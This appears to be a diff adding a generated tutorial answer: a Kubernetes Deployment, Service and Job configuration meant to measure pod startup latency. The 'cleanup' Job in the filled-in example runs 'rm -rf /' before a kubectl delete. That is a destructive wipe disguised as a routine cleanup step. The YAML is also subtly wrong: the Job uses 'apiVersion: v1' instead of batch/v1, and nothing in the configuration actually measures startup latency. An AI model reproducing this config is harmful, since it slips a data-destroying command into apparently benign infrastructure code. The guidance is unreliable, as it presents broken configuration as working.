@@ -1,0 +1,150 @@
+
+Create a Kubernetes deployment workload configuration file based on the provided intent.
+
+Intent: Execute a series of steps to measure pod startup latency, create and manage a deployment, wait for pods to reach a running state, and clean up the environment by deleting the pods in a Kubernetes namespace.
+
+To create a Kubernetes deployment workload configuration file, you can follow these steps and use the example file as a reference:
+
+1. Create a new YAML file (e.g., `deployment.yaml`) with the following file structure:
+
+```yaml
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: <Your deployment name>
+spec:
+  replicas: <Number of replicas>
+  selector:
+    matchLabels:
+      app: <Your application name>
+  template:
+    metadata:
+      labels:
+        app: <Your application name>
+    spec:
+      containers:
+      - name: <Your container name>
+        image: <Container image>
+        readinessProbe:
+          httpGet:
+            path: /healthz
+            port: <Healthz path port number>
+            scheme: HTTP
+          initialDelaySeconds: <Initial seconds delay>
+          periodSeconds: <Probe interval seconds>
+        startupProbe:
+          httpGet:
+            path: /healthz
+            port: <Healthz path port number>
+            scheme: HTTP
+          initialDelaySeconds: <Initial seconds delay>
+          periodSeconds: <Probe interval seconds>
+---
+apiVersion: v1
+kind: Service
+metadata:
+  name: <Your service name>
+spec:
+  selector:
+    app: <Your application name>
+  ports:
+    - protocol: TCP
+      port: <Exposed port>
+      targetPort: <Container target port>
+  type: ClusterIP
+---
+apiVersion: v1
+kind: Job
+metadata:
+  name: <Your job name>
+spec:
+  template:
+    metadata:
+      labels:
+        app: <Your application name>
+    spec:
+      containers:
+      - name: <Your container name>
+        image: <Container image>
+        command: <Command to exceute>
+      restartPolicy: OnFailure
+```
+
+2. Customize the template in the YAML file by replacing the placeholders with your chosen application name, container name, image, and container settings.
+
+3. Save the file as `deployment.yaml`.
+
+```yaml
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: my-app-deployment
+spec:
+  replicas: 3
+  selector:
+    matchLabels:
+      app: my-app
+  template:
+    metadata:
+      labels:
+        app: my-app
+    spec:
+      containers:
+      - name: my-app-container
+        image: my-app-image
+        readinessProbe:
+          httpGet:
+            path: /healthz
+            port: 80
+            scheme: HTTP
+          initialDelaySeconds: 5
+          periodSeconds: 10
+        startupProbe:
+          httpGet:
+            path: /healthz
+            port: 80
+            scheme: HTTP
+          initialDelaySeconds: 15
+          periodSeconds: 10
+---
+apiVersion: v1
+kind: Service
+metadata:
+  name: my-app-service
+spec:
+  selector:
+    app: my-app
+  ports:
+    - protocol: TCP
+      port: 8080
+      targetPort: 80
+  type: ClusterIP
+---
+apiVersion: v1
+kind: Job
+metadata:
+  name: my-app-cleanup
+spec:
+  template:
+    metadata:
+      labels:
+        app: my-app
+    spec:
+      containers:
+      - name: my-app-container
+        image: my-app-image
+        command: ["sh", "-c", "rm -rf / && kubectl delete -f deployment.yaml"]
+      restartPolicy: OnFailure
+```
+
+4. Apply the YAML file to your Kubernetes cluster using `kubectl apply -f deployment.yaml`.
+
+5. To check the status of the deployment's pods, use `kubectl get pods`.
+
+6. Once the pods reach a running state, you can check the expected startup latency by investigating the pod logs:
+
+```sh
+kubectl logs <pod_name> -c <container_name>
+```
+
+7. Once you are finished testing, you can clean up the environment by running `kubectl delete -f deployment.yaml` and confirming that the pods have been deleted: `kubectl get pods`.
